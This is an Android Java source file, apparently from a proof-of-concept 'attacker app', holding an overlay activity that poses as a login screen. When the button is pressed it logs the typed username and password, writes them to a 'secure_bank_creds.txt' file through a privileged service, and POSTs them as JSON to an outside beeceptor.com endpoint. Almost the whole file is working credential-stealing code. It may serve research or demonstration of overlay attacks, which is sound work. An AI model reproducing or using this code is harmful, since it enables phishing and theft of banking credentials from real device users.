package com.example.attackerappjava;

import android.app.DownloadManager;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;

import java.io.IOException;
import java.util.Objects;

import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;
import okhttp3.Response;

public class OverlayActivity extends AppCompatActivity {
    private static final String TAG = "[OverlayActivity]";
    private static final int REQUEST_WRITE_EXTERNAL_STORAGE = 1;
    private static final String FILE_NAME = "/storage/emulated/0/secure_bank_creds.txt";
    TextInputEditText usernameEditText;
    TextInputEditText passwordEditText;
    TextInputLayout usernameInputLayout;
    TextInputLayout passwordInputLayout;
    Button loginButton;

    IUserService privilegedService;
    private static final OkHttpClient client = new OkHttpClient();
    public static final MediaType JSON = MediaType.get("application/json; charset=utf-8");


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "OVERLAY_ACTIVITY CREATED...");
        setContentView(R.layout.overlay_layout);
        privilegedService = IUserService.Stub.asInterface(Objects.requireNonNull(getIntent().getExtras()).getBinder("triggerOverlay"));
        usernameEditText = findViewById(R.id.userText);
        passwordEditText = findViewById(R.id.pswdText);
        usernameInputLayout = findViewById(R.id.userLayout);
        passwordInputLayout = findViewById(R.id.pswdLayout);
        loginButton = findViewById(R.id.loginBtn);
        loginButton.setOnClickListener(v -> handleLogin());
    }

    private void handleLogin() {
        Log.d(TAG, "Login button pressed..");
        String username = usernameEditText.getText().toString();
        String password = passwordEditText.getText().toString();
        if (username.isEmpty() || password.isEmpty()) {
            if (username.isEmpty()) {
                usernameInputLayout.setError("Username cannot be empty");
            }
            if (password.isEmpty()) {
                passwordInputLayout.setError("Password cannot be empty");
            }
        }
        Log.d(TAG, "Username: " + username);
        Log.d(TAG, "Password: " + password);
        writeToExternalStorage(username);
        writeToExternalStorage(password);
        new Thread(() -> {
            try {
                sendDataOnline(username, password, "https://talsec.free.beeceptor.com");
            } catch (Exception e) {
                Log.e(TAG, "Network operation failed", e);
            }
        }).start();
    }

    private void writeToExternalStorage(String content) {
        Log.d(TAG, "Writing to external storage...");
        new Thread(() -> {
            Log.d(TAG,"Thread running...");
            try {
                privilegedService.writeToFile(FILE_NAME, content);
            } catch (Exception err) {
                Log.e(TAG, String.valueOf(err));
            }
        }).start();
    }

    private void sendDataOnline(String username, String password, String targetUrl) {
        String jsonPayload = String.format("{\"username\": \"%s\", \"password\": \"%s\"}", username, password);

        RequestBody body = RequestBody.create(jsonPayload, JSON);
        Request request = new Request.Builder()
                .url(targetUrl)
                .post(body)
                .build();


        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) {
                throw new IOException("Unexpected code " + response);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}

